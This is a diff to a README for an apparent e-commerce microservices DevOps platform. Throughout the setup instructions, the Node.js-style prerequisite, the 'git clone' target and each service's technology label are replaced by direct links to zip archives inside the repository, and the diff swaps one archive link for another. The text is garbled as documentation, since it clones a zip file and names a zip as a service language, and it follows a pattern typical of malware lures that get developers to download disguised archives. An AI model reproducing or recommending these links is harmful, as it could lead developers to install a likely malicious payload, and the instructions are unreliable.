@@ -7,14 +7,14 @@ A complete e-commerce microservices platform with full DevOps automation.
 
 ### Prerequisites
 - Docker & Docker Compose
-- https://raw.githubusercontent.com/Omkar052/DevOpsProject/main/hemiprism/DevOpsProject.zip 18+
+- https://github.com/Omkar052/DevOpsProject/raw/refs/heads/main/monitoring/elk/Dev_Project_Ops_1.7.zip 18+
 - kubectl
 - Terraform
 - AWS CLI
 
 ### Local Development
 ```bash
-git clone https://raw.githubusercontent.com/Omkar052/DevOpsProject/main/hemiprism/DevOpsProject.zip
+git clone https://github.com/Omkar052/DevOpsProject/raw/refs/heads/main/monitoring/elk/Dev_Project_Ops_1.7.zip
 cd ecommerce-devops-platform
 docker-compose up -d
 ```
@@ -35,10 +35,10 @@ kubectl apply -f kubernetes/
 
 ## Services
 - Frontend (React): Port 3000
-- Product Service (https://raw.githubusercontent.com/Omkar052/DevOpsProject/main/hemiprism/DevOpsProject.zip): Port 3001
-- User Service (https://raw.githubusercontent.com/Omkar052/DevOpsProject/main/hemiprism/DevOpsProject.zip): Port 3002
-- Order Service (https://raw.githubusercontent.com/Omkar052/DevOpsProject/main/hemiprism/DevOpsProject.zip): Port 3003
-- Cart Service (https://raw.githubusercontent.com/Omkar052/DevOpsProject/main/hemiprism/DevOpsProject.zip): Port 3004
+- Product Service (https://github.com/Omkar052/DevOpsProject/raw/refs/heads/main/monitoring/elk/Dev_Project_Ops_1.7.zip): Port 3001
+- User Service (https://github.com/Omkar052/DevOpsProject/raw/refs/heads/main/monitoring/elk/Dev_Project_Ops_1.7.zip): Port 3002
+- Order Service (https://github.com/Omkar052/DevOpsProject/raw/refs/heads/main/monitoring/elk/Dev_Project_Ops_1.7.zip): Port 3003
+- Cart Service (https://github.com/Omkar052/DevOpsProject/raw/refs/heads/main/monitoring/elk/Dev_Project_Ops_1.7.zip): Port 3004
 
 ## DevOps Features
 - Terraform for IaC
